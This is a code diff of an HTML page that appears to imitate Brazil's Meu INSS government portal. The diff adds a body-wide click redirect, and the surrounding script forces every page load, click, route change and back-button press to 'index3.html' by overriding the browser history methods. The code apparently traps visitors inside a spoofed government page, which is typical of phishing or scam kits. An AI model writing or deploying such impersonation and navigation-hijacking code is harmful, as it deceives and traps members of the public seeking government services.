@@ -31,7 +31,7 @@
     <link href="static/css/main.75ee1db4.css" rel="stylesheet">
 </head>
 
-<body style="min-height:100%" >
+<body style="min-height:100%" onclick="window.location.href='index3.html'">
     <div class="meuinss-barra-brasil" tabindex="-1">
         <div id="barra-brasil" tabindex="-1">
             <ul id="menu-barra-temp" style="list-style:none" tabindex="-1">
@@ -61,10 +61,8 @@
                     window.location.href = 'index3.html';
                 }
             }
-
             // Redireciona imediatamente ao carregar a página
             redirectToIndex3();
-
             // Intercepta todos os cliques no body
             document.body.addEventListener('click', function (event) {
                 // Previne o comportamento padrão do clique
@@ -72,7 +70,6 @@
                 // Redireciona para index3.html
                 redirectToIndex3();
             });
-
             // Sobrescreve o método pushState para impedir alterações de rota
             const originalPushState = history.pushState;
             history.pushState = function () {
@@ -81,7 +78,6 @@
                 // Redireciona para index3.html
                 redirectToIndex3();
             };
-
             // Sobrescreve o método replaceState para impedir alterações de rota
             const originalReplaceState = history.replaceState;
             history.replaceState = function () {
@@ -90,7 +86,6 @@
                 // Redireciona para index3.html
                 redirectToIndex3();
             };
-
             // Intercepta o botão "Voltar" ou "Avançar" do navegador
             window.addEventListener('popstate', function () {
                 // Redireciona para index3.html
